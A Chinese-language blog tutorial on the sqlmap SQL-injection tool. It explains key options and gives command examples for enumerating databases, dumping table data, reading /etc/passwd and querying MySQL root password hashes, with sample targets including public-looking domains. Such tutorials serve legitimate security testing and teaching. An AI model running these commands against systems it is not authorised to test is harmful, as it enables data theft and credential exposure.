---
title: Net—sqlmap 使用指南
date: 2020-11-19
author: LM
tags: ["网络测试"]
---

## 1.sqlmap中部分参数的备注

### 星号（ * ）

在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：`'/admin/1/'`，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如`sqlmap -u "www.baidu.com/admin/1*"`

### --data

使用 post 方式提交时，需要用到 data 参数

### -p

当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间

### --level

不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。

### --random-agent

使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent

### --technique

这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：

- B：Boolean-based blind SQL injection（布尔型注入）
- E：Error-based SQL injection（报错型注入）
- U：UNION query SQL injection（可联合查询注入）
- S：Stacked queries SQL injection（可多语句查询注入）
- T：Time-based blind SQL injection（基于时间延迟注入）

## 2.常用的指令

```shell
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11"        # 检查注入点 
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" --dbs  # 列出数据库信息    
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx --tables            # 指定库名, 并列出所有表
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx -T admin --columns  # 指定库名, 并表名列出所有字段
                                                                               
sqlmap -u "注入地址" -v 1 --dbs              # 列出数据库   
sqlmap -u "注入地址" -v 1 --current-db       # 列出当前数据库  
sqlmap -u "注入地址" -v 1 --users            # 列出数据库用户  
sqlmap -u "注入地址" -v 1 --current-user     # 列出当前用户  
sqlmap -u "注入地址" -v 1 --tables -D "数据库"                         # 列出数据库的表名  
sqlmap -u "注入地址" -v 1 --columns -T "表名" -D "数据库"               # 获取表的列名  
sqlmap -u "注入地址" -v 1 --dump -C "字段,字段" -T "表名" -D "数据库"    # 获取表中的数据   
```

## 3.Sqlmap参数使用实例

```shell
# 指定参数注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "id" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "cat,id" 
# 指定方法和post的数据 
sqlmap -u "http://192.168.1.47/page.php" --method "POST" --data "id=1&cat=2" 
# 指定cookie,可以注入一些需要登录的地址 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --cookie "COOKIE_VALUE" 
# 指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --string "STRING_ON_TRUE_PAGE" 
# 显示指定的文件内容，一般用于php 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --file-read /etc/passwd 
# 执行你自己的sql语句
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --sql-query="SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" 
# union注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --union-check 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --union-use --banner 
# 保存注入过程到一个文件, 支持从文件恢复出注入过程 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -b -o "sqlmap.log" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --banner -o "sqlmap.log" --resume
```
